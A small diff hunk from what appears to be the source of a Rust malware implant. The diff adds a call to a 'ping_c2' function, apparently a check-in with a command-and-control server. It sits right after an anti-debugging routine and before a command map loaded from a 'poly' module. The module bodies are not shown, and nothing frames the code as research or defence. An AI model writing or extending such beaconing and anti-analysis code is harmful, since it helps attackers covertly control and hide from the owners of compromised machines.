@@ -37,6 +37,7 @@ async fn main() {
     }
 
     anti_debug::anti_debug_response();
+    let _ = connexion::ping_c2().await;
 
     if let Some(cmd_map) = poly::get_command_map() {
         let mapping = connexion::CommandMapping {
